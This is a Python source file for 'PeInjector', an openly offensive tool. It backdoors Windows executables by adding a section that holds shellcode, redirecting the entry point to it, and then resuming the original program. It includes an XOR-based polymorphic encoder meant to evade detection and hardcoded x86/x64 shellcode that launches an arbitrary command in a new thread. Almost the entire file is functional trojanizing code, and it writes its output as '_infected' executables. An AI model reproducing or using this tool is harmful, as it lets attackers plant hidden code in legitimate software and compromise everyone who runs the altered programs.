#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This python tool injects shellcode in Windows Program Executable to
#    backdoor it with optional polymorphism.
#    Copyright (C) 2024  PeInjector

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This python tool injects shellcode in Windows Program Executable to
backdoor it with optional polymorphism.
"""

__version__ = "1.2.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This python tool injects shellcode in Windows Program Executable to
backdoor it with optional polymorphism.
"""
__url__ = "https://github.com/mauricelambert/PeInjector"

__all__ = ["main", "inject"]

__license__ = "GPL-3.0 License"
__copyright__ = """
PeInjector  Copyright (C) 2024  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
copyright = __copyright__
license = __license__

print(copyright)

from sys import argv, stderr, exit, executable
from dataclasses import dataclass, field
from os.path import splitext, isfile
from _io import _BufferedIOBase
from typing import Tuple, List
from base64 import b16decode
from random import randrange


@dataclass
class NewValues:
    """
    This class stores modified values
    for the backdoored PE file.
    """

    image_size: int = 0
    headers_size: int = 0
    file_size: int = 0
    section_offset: int = 0
    entry_point: int = 0
    first_section_offset: int = 0


@dataclass
class Section:
    """
    This class stores parsed sections values.
    """

    address_headers: int = 0
    virtual_address: int = 0
    virtual_size: int = 0
    file_offset: int = 0
    file_size: int = 0


@dataclass
class PeInjectorData:
    """
    This class stores all data used to
    backdoor a Program Executable.
    """

    address_nt_headers: int = 0
    machine_architecture: int = 0
    sections_number: int = 0
    optional_headers_size: int = 0
    entry_point: int = 0
    section_aligment: int = 0
    file_aligment: int = 0
    image_size: int = 0
    headers_size: int = 0
    image_base: int = 0
    offset_new_section_headers: int = 0
    address_end_new_section_headers: int = 0
    first_section_offset: int = 0
    sections: List[Section] = field(default_factory=list)
    new_values: NewValues = field(default_factory=NewValues)
    shellcode: bytes = None


class ProgramExecutableError(ValueError):
    """
    PeInjector support only Windows Program Executable,
    if the file is not in the good format this
    class should be used to raise an exception.
    """


class ArchitectureError(ValueError):
    """
    PeInjector support only x86 and x64 Program Executable,
    if the executable is not in theses architectures this
    class should be used to raise an exception.
    """

    architecture: str = None


machine_types = {
    0x014C: "x86",
    0x8664: "x64",
    0x0200: "IA64",
    0x01C0: "ARM",
    0xAA64: "ARM64",
}


def arg_parse() -> Tuple[str, str, bool]:
    """
    This function parse the command line arguments and returns:
        1. Executable path
        2. Hexadecimal shellcode
        3. Use polymorphism
        4. Use default shellcode to run a command
    """

    polymorphism = command = False
    if len(argv) == 4 or len(argv) == 5:
        if "-p" in argv:
            argv.remove("-p")
            polymorphism = True
        elif "--polymorphism" in argv:
            argv.remove("--polymorphism")
            polymorphism = True
        if "-c" in argv:
            argv.remove("-c")
            command = True
        elif "--command" in argv:
            argv.remove("--command")
            command = True

    if len(argv) != 3:
        print(
            "USAGES: ",
            executable,
            argv[0],
            "-p -c <executable_path> <shellcode_hexadecimal or command>",
            file=stderr,
        )
        exit(1)

    _, file_path, shellcode = argv

    if not isfile(file_path):
        print(
            "<executable_path>: should be a valid and existing path",
            file=stderr,
        )
        exit(2)

    if (
        any(x not in "0123456789abcdefABCDEF" for x in shellcode)
        and not command
    ):
        print(
            "<shellcode_hexadecimal or command>: should be a hexadecimal",
            " value or a string command when you use the -c/--command value",
            file=stderr,
        )
        exit(3)

    return file_path, shellcode, polymorphism, command


def parse_nt_headers(
    injector_data: PeInjectorData, memory_file_mapping: memoryview
) -> memoryview:
    """
    This function parses the NT headers.

    This class raise ProgramExecutableError exception
    if the file don't contains valid DOS and NT magic headers.
    """

    if bytes(memory_file_mapping[0:2]) != b"MZ":
        raise ProgramExecutableError(
            "Invalid DOS headers, b'MZ' != "
            + repr(bytes(memory_file_mapping[0:2]))
        )

    injector_data.address_nt_headers = int.from_bytes(
        memory_file_mapping[0x3C : 0x3C + 4], "little"
    )

    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]

    if bytes(nt_headers[0:4]) != b"PE\0\0":
        raise ProgramExecutableError(
            "Invalid NT headers, b'PE\\x0\\x0' != "
            + repr(bytes(nt_headers[0:4]))
        )

    image_headers = nt_headers[4:]
    injector_data.machine_architecture = int.from_bytes(
        image_headers[0:2], "little"
    )
    injector_data.sections_number = int.from_bytes(
        image_headers[2:4], "little"
    )
    injector_data.optional_headers_size = int.from_bytes(
        image_headers[0x10:0x12], "little"
    )

    return nt_headers


def parse_optional_headers(
    injector_data: PeInjectorData, nt_headers: memoryview
) -> memoryview:
    """
    This function parses the optional headers.
    """

    optional_headers = nt_headers[0x18:]
    injector_data.entry_point = int.from_bytes(
        optional_headers[0x10:0x14], "little"
    )
    injector_data.section_aligment = int.from_bytes(
        optional_headers[0x20:0x24], "little"
    )
    injector_data.file_aligment = int.from_bytes(
        optional_headers[0x24:0x28], "little"
    )
    injector_data.image_size = int.from_bytes(
        optional_headers[0x38:0x3C], "little"
    )
    injector_data.new_values.headers_size = injector_data.headers_size = (
        int.from_bytes(optional_headers[0x3C:0x40], "little")
    )

    return optional_headers


def parse_sections_headers(
    injector_data: PeInjectorData, optional_headers: memoryview
) -> memoryview:
    """
    This function parses the sections headers.
    """

    section_headers = optional_headers[injector_data.optional_headers_size :]

    for index in range(injector_data.sections_number):
        section = Section()
        injector_data.sections.append(section)

        section.virtual_address = int.from_bytes(
            section_headers[0xC:0x10], "little"
        )
        section.virtual_size = int.from_bytes(
            section_headers[0x8:0xC], "little"
        )
        section.file_offset = int.from_bytes(
            section_headers[0x14:0x18], "little"
        )
        section.file_size = int.from_bytes(
            section_headers[0x10:0x14], "little"
        )

        section_headers = section_headers[40:]

    section.address_headers = (injector_data.sections_number - 1) * 0x28
    injector_data.offset_new_section_headers = section.address_headers + 0x28

    return section_headers


def parse_pe_file(
    executable: _BufferedIOBase,
) -> Tuple[memoryview, PeInjectorData]:
    """
    This function parses the PE file.
    """

    data = bytearray(executable.read())

    file_mapping = memoryview(data)
    injector_data = PeInjectorData()

    nt_headers = parse_nt_headers(injector_data, file_mapping)
    optional_headers = parse_optional_headers(injector_data, nt_headers)

    if machine_types[injector_data.machine_architecture] == "x64":
        injector_data.image_base = int.from_bytes(
            optional_headers[0x18:0x20], "little"
        )
    elif machine_types[injector_data.machine_architecture] == "x86":
        injector_data.image_base = int.from_bytes(
            optional_headers[0x1C:0x20], "little"
        )
    else:
        exception = ArchitectureError(
            "Invalid architecture, support only x86 and x64"
        )
        exception.architecture = injector_data.machine_architecture
        raise exception

    parse_sections_headers(injector_data, optional_headers)

    return file_mapping, injector_data


def calcul_entrypoint(injector_data: PeInjectorData) -> int:
    """
    This function calcul entry point (original entry point and new entrypoint).
    """

    original_entry_point = injector_data.entry_point + injector_data.image_base
    last_section = injector_data.sections[-1]

    last_section_virtual_end_address = (
        last_section.virtual_size + last_section.virtual_address
    )
    virtual_padding = (
        last_section_virtual_end_address % injector_data.section_aligment
    )
    injector_data.new_values.entry_point = last_section_virtual_end_address + (
        (injector_data.section_aligment - virtual_padding)
        if virtual_padding
        else 0
    )

    return original_entry_point


def generate_shellcode_suffix(
    injector_data: PeInjectorData, key: bytes, polymorphism: bool
) -> bytes:
    """
    This function generates the shellcode suffix
    (jump on the original entry point).
    """

    original_entry_point = calcul_entrypoint(injector_data)

    suffix = b"\xe9" + (
        original_entry_point
        - (
            injector_data.new_values.entry_point
            + len(injector_data.shellcode)
            + 5
            + injector_data.image_base
        )
    ).to_bytes(4, "little", signed=True)

    if polymorphism:
        injector_data.shellcode += bytes(byte ^ key for byte in suffix)

    return suffix


def build_injected_shellcode(
    injector_data: PeInjectorData, polymorphism: bool, command: bool
) -> bytes:
    """
    This function generates the injected shellcode.

    final shellcode: (
        (prefix (crypter) if polymorphism)
        + shellcode
        + suffix (jmp OEP)
    )
    """

    if machine_types[injector_data.machine_architecture] == "x64":
        # rex_instruction = b"\x48"
        crypter = bytes.fromhex(
            "eb24584889c248054f5f6f7f48c7c1aa0000008"
            "a1830cb881848ffc84839c27ef248ffc0ffe0e8d7ffffff"
        )
        generate_command_shellcode = generate_command_shellcode_x64
    elif machine_types[injector_data.machine_architecture] == "x86":
        # rex_instruction = b""
        crypter = bytes.fromhex(
            "eb1d5889c2054f5f6f7fc7c1aa0000008a183"
            "0cb8818ffc839c27ef440ffe0e8deffffff"
        )
        generate_command_shellcode = generate_command_shellcode_x86

    # injector_data.shellcode += (
    #     rex_instruction + b"\xb8" + original_entry_point + b"\xff\xe0"
    # )

    if command:
        injector_data.shellcode = b16decode(
            generate_command_shellcode(injector_data.shellcode)
            .upper()
            .encode()
        )

    key = None
    if polymorphism:
        key = randrange(256)
        shellcode_length = len(injector_data.shellcode) + 5
        crypter = crypter.replace(b"\xaa", key.to_bytes()).replace(
            b"\x4f\x5f\x6f\x7f", shellcode_length.to_bytes(4, "little")
        )
        injector_data.shellcode = crypter + bytes(
            (byte ^ key for byte in injector_data.shellcode)
        )

    injector_data.shellcode += generate_shellcode_suffix(
        injector_data, key, polymorphism
    )
    return injector_data.shellcode


def generate_new_section_headers(
    injector_data: PeInjectorData,
    file_new_section_size: int,
    polymorphism: bool,
) -> bytes:
    """
    This function generates the new sections headers.
    """

    shellcode_length = len(injector_data.shellcode)
    new_section_headers = b".inject".ljust(
        8, b"\0"
    )  # '.text', '.code', '.init', '.textbss', '.text1', '.itext'

    new_section_headers += shellcode_length.to_bytes(4, "little")
    new_section_headers += injector_data.new_values.entry_point.to_bytes(
        4, "little"
    )

    new_section_headers += file_new_section_size.to_bytes(4, "little")
    new_section_headers += injector_data.new_values.section_offset.to_bytes(
        4, "little"
    )

    new_section_headers += b"\0" * 12
    new_section_headers += (
        0xE0000020 if polymorphism else 0x60000020
    ).to_bytes(4, "little")

    # assert len(new_section_headers) == 0x28

    return new_section_headers


def get_new_section_offset(injector_data: PeInjectorData) -> Tuple[int, int]:
    """
    This function calculs new section offset.
    """

    shellcode_length = len(injector_data.shellcode)
    file_padding = shellcode_length % injector_data.file_aligment
    file_new_section_size = shellcode_length + (
        (injector_data.file_aligment - file_padding) if file_padding else 0
    )

    last_section = injector_data.sections[-1]
    last_section_file_end_address = (
        last_section.file_offset + last_section.file_size
    )
    file_padding = last_section_file_end_address % injector_data.file_aligment
    injector_data.new_values.section_offset = last_section_file_end_address + (
        (injector_data.file_aligment - (file_padding)) if file_padding else 0
    )

    injector_data.new_values.image_size = (
        len(injector_data.shellcode) + injector_data.new_values.entry_point
    )
    injector_data.new_values.file_size = (
        file_new_section_size + injector_data.new_values.section_offset
    )

    return last_section_file_end_address, file_new_section_size


def rewrite_sections_position(
    injector_data: PeInjectorData, section_headers: memoryview
) -> None:
    """
    This function writes new section offsets.
    """

    injector_data.new_values.first_section_offset += 512
    injector_data.new_values.section_offset += 512
    injector_data.new_values.headers_size += 512
    injector_data.new_values.file_size += 512

    for index in range(injector_data.sections_number):
        section = injector_data.sections[index]
        section.file_offset += 512
        section_headers[0x14:0x18] = section.file_offset.to_bytes(4, "little")
        section_headers = section_headers[40:]


def check_new_section_injection(
    injector_data: PeInjectorData, memory_file_mapping: memoryview
) -> memoryview:
    """
    This function checks if new headers can be write,
    modify sections position instead.
    """

    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]
    optional_headers = nt_headers[0x18:]
    section_headers = optional_headers[injector_data.optional_headers_size :]

    injector_data.new_values.first_section_offset = (
        injector_data.first_section_offset
    ) = min(
        (
            section.file_offset
            for section in injector_data.sections
            if section.file_offset
        )
    )

    injector_data.address_end_new_section_headers = (
        injector_data.offset_new_section_headers
        + (len(memory_file_mapping) - len(section_headers))
        + 40
    )

    if (
        injector_data.address_end_new_section_headers
        > injector_data.first_section_offset
    ):
        rewrite_sections_position(injector_data, section_headers)

    return section_headers


def get_new_section_headers(
    injector_data: PeInjectorData,
    memory_file_mapping: memoryview,
    polymorphism: bool,
) -> Tuple[bytes, int]:
    """
    This function inject the section headers.

    This function returns the end address of the last section.
    """

    last_section_file_end_address, file_new_section_size = (
        get_new_section_offset(injector_data)
    )
    check_new_section_injection(injector_data, memory_file_mapping)
    new_section_headers = generate_new_section_headers(
        injector_data, file_new_section_size, polymorphism
    )

    return new_section_headers, last_section_file_end_address


def rewrite_pe_headers(
    injector_data: PeInjectorData,
    memory_file_mapping: memoryview,
) -> memoryview:
    """
    This function writes new value for PE headers.
    """

    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]
    image_headers = nt_headers[4:]
    optional_headers = nt_headers[0x18:]

    image_headers[2:4] = (injector_data.sections_number + 1).to_bytes(
        2, "little"
    )
    optional_headers[0x38:0x3C] = injector_data.new_values.image_size.to_bytes(
        4, "little"
    )
    optional_headers[0x3C:0x40] = (
        injector_data.new_values.headers_size.to_bytes(4, "little")
    )
    optional_headers[0x10:0x14] = (
        injector_data.new_values.entry_point.to_bytes(4, "little")
    )

    return optional_headers


def write_new_pe_file(
    injector_data: PeInjectorData,
    memory_file_mapping: memoryview,
    executable: _BufferedIOBase,
    new_section_headers: bytes,
    last_section_end_address: int,
) -> bytes:
    """
    This function writes the final shellcode in the new section.
    """

    new_file_content = (
        (
            bytes(
                memory_file_mapping[
                    : injector_data.address_end_new_section_headers - 40
                ]
            )
            + new_section_headers
        ).ljust(injector_data.new_values.first_section_offset, b"\0")
        + bytes(
            memory_file_mapping[
                injector_data.first_section_offset : last_section_end_address
            ]
        ).ljust(
            injector_data.new_values.section_offset
            - injector_data.new_values.first_section_offset,
            b"\0",
        )
        + injector_data.shellcode
    ).ljust(injector_data.new_values.file_size, b"\0") + bytes(
        memory_file_mapping[last_section_end_address:]
    )

    executable.write(new_file_content)
    return new_file_content


def inject(
    target_executable: _BufferedIOBase,
    backdoored_executable: _BufferedIOBase,
    shellcode: bytes,
    polymorphism: bool = False,
    command: bool = False,
) -> bytes:
    """
    This function injects the shellcode into the backdoored executable.
    """

    memory_file_mapping, injector_data = parse_pe_file(target_executable)
    injector_data.shellcode = shellcode

    build_injected_shellcode(injector_data, polymorphism, command)

    new_section_headers, last_section_end_address = get_new_section_headers(
        injector_data, memory_file_mapping, polymorphism
    )
    rewrite_pe_headers(injector_data, memory_file_mapping)

    return write_new_pe_file(
        injector_data,
        memory_file_mapping,
        backdoored_executable,
        new_section_headers,
        last_section_end_address,
    )


def generate_command_shellcode_x86(command: str) -> bytes:
    """
    This function generates a x64 shellcode to start a command in a new thread.
    """

    command = command.encode() + b"\x00"
    command_length = len(command).to_bytes(4, "little")

    shellcode = (
        "9090609cfc90e8c60000006089e531d290648b15300000008b520c8b5214eb"
        "0272288b722831c9668b4a2631ff31c0ac3c617c022c20c1cf0d01c74975ef"
        "5290578b5210908b423c01d0908b4078eb09eb07ea484204857c3a85c0746a"
        "9001d050908b48188b582001d3e35a498b348b01d631ff9031c0eb06ff69d5"
        "380dcfacc1cf0d01c738e0eb057f1bd2eb0375e4037df83b7d2475d258908b"
        "582401d390668b0c4b8b581c01d390eb04cd97f1b18b048b01d09089442424"
        "5b5b6190595a51eb010fffe058905f5a8b12e951ffffff905d90bec6000000"
        "906a4090680010000056906a006858a453e5ffd589c389c79089f1eb41905e"
        "909090f2a4e820000000bbe01d2a0a9068a695bd9dffd53c067c0a80fbe075"
        "05bb4713726f6a0053ffd531c05050505350506838680d16ffd558589061eb"
        "05e8bafffffffce8840000006089e531c0648b50308b520c8b52148b722831"
        "c9668b4a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c"
        "1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c7"
        "38e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01"
        "d0894424245b5b61595a51ffe05f5f5a8b12eb8b5d6a018d85b90000005068"
        "318b6f87ffd5bbaac5e25d68a695bd9dffd53c067c0a80fbe07505bb471372"
        "6f6a0053ffd5e9"
    )

    shellcode += command_length.hex() + command.hex()

    return shellcode


def generate_command_shellcode_x64(command: str) -> bytes:
    """
    This function generates a x64 shellcode to start a command in a new thread.
    """

    command = command.encode() + b"\x00"
    command_length = len(command).to_bytes(4, "little")

    shellcode = (
        "9050535152565755415041514152415341544155415641579c90e8c0000000"
        "415141505251564831d265488b5260488b5218488b5220488b7250480fb74a"
        "4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b"
        "423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e3"
        "5648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c03"
        "4c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04"
        "884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b"
        "12e957ffffff5d41be120100006a404159680010000041584c89f26a005968"
        "58a453e5415affd54889c34889c7b912010000eb425ef2a4e8000000004831"
        "c050504989c14889c24989d84889c141ba38680d16ffd54883c4589d415f41"
        "5e415d415c415b415a415941585d5c5f5e5a595b58e917010000e8b8ffffff"
        "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b"
        "5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1"
        "e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b"
        "4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c9"
        "0d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48"
        "448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec20"
        "4152ffe05841595a488b12e957ffffff5dba01000000488d8d0101000041ba"
        "318b6f87ffd5bbaac5e25d41baa695bd9dffd54883c4283c067c0a80fbe075"
        "05bb4713726f6a00594189daffd5e9"
    )

    shellcode += (
        command_length.hex()
        + command.hex()
        + "4883c4604831ed9d415f415e415d415c415b415a415941585d5f5e5a595b58"
    )

    return shellcode


def main() -> int:
    """
    This function starts the program from the command line.
    """

    executable, shellcode, polymorphism, command = arg_parse()

    path, extension = splitext(executable)
    new_path = path + "_infected" + extension

    with open(executable, "rb") as target, open(new_path, "wb") as backdoor:
        try:
            inject(
                target,
                backdoor,
                (
                    shellcode
                    if command
                    else b16decode(shellcode.upper().encode())
                ),
                polymorphism,
                command,
            )
        except ArchitectureError as e:
            print(
                "Invalid architecture: x64 or x86 architecture required, not",
                machine_types[e.architecture],
                file=stderr,
            )
            return 4
        except ProgramExecutableError:
            print(
                "Invalid file format: magic bytes are invalid",
                file=stderr,
            )
            return 5

    return 0


if __name__ == "__main__":
    exit(main())
